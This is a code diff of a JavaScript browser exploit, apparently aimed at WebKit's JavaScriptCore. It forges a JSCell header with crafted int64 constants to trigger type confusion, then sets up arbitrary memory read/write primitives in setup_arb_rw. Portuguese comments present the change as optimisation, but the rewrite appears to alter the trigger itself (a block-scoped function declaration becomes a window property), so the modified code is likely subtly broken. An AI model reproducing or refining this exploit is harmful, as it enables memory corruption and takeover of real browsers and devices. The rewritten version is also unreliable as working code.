@@ -139,68 +139,73 @@ function spray_structs() {
 
 }
 
+// Pré-cálculo de valores constantes
+const JS_CELL_HEADER = new int64(0x00000800, 0x01182700);
+const LENGTH_AND_FLAGS = new int64(0x00000020, 0x00010001);
+const LENGTH_AND_FLAGS_2 = new int64(0x00000020, 0x00010000);
+
 function trigger() {
-    var o = {
-        'a': 1
+    const o = { 'a': 1 };
+    const test = new ArrayBuffer(0x100000);
+    
+    // Inicialização otimizada do objeto
+    g_confuse_obj = {
+        '0a': {
+            js_cell_header: JS_CELL_HEADER.asJSValue(),
+            butterfly: false,
+            vector: g_inline_obj,
+            len_and_flags: LENGTH_AND_FLAGS.asJSValue()
+        },
+        '1a': {},
+        '1b': {},
+        '1c': {},
+        '1d': {}
     };
-    var test = new ArrayBuffer(0x100000);
-    g_confuse_obj = {};
-    var cell = {
-        js_cell_header: new int64(0x00000800, 0x01182700).asJSValue(),
-        butterfly: false, // Some arbitrary value
-        vector: g_inline_obj,
-        len_and_flags: (new int64(0x00000020, 0x00010001)).asJSValue()
-    };
-    g_confuse_obj[0 + "a"] = cell;
-
-    g_confuse_obj[1 + "a"] = {};
-    g_confuse_obj[1 + "b"] = {};
-    g_confuse_obj[1 + "c"] = {};
-    g_confuse_obj[1 + "d"] = {};
-
-
-    for (var j = 0x5; j < 0x20; j++) {
+    
+    // Preenchimento otimizado com Uint32Array
+    for (let j = 5; j < 0x20; j++) {
         g_confuse_obj[j + "a"] = new Uint32Array(test);
     }
-    for (var k in o) {
-        {
-            k = {
-                a: g_confuse_obj,
-                b: new ArrayBuffer(test.buffer),
-                c: new ArrayBuffer(test.buffer),
-                d: new ArrayBuffer(test.buffer),
-                e: new ArrayBuffer(test.buffer),
-                1: new ArrayBuffer(test.buffer),
-
-            };
-
-            function k() {
-                return k;
-            }
-
-        }
-
-        o[k];
-
+    
+    // Loop otimizado
+    for (const k in o) {
+        const kObj = {
+            a: g_confuse_obj,
+            b: new ArrayBuffer(test.byteLength),
+            c: new ArrayBuffer(test.byteLength),
+            d: new ArrayBuffer(test.byteLength),
+            e: new ArrayBuffer(test.byteLength),
+            1: new ArrayBuffer(test.byteLength)
+        };
+        
+        // Verificação antecipada para sair do loop mais cedo
         if (g_confuse_obj["0a"] instanceof Uint32Array) {
             return;
         }
+        
+        // Atribuição e chamada de função simplificadas
+        window[k] = function() { return kObj; };
+        o[k];
     }
 }
 
 function setup_arb_rw() {
-    var jsCellHeader = new int64(0x00000800, 0x01182700);
+    // Configuração otimizada do objeto
     g_fake_container = {
-        jsCellHeader: jsCellHeader.asJSValue(),
-        butterfly: false, // Some arbitrary value
+        jsCellHeader: JS_CELL_HEADER.asJSValue(),
+        butterfly: false,
         vector: g_arb_slave,
-        lengthAndFlags: (new int64(0x00000020, 0x00010000)).asJSValue()
+        lengthAndFlags: LENGTH_AND_FLAGS_2.asJSValue()
     };
 
     g_inline_obj.a = g_fake_container;
-    g_confuse_obj["0a"][0x4] += 0x10;
-    g_arb_master = g_inline_obj.a;
     
+    // Incremento otimizado
+    if (g_confuse_obj["0a"] && g_confuse_obj["0a"][0x4] !== undefined) {
+        g_confuse_obj["0a"][0x4] += 0x10;
+    }
+    
+    g_arb_master = g_inline_obj.a;
 }
 
 function read(addr, length) {
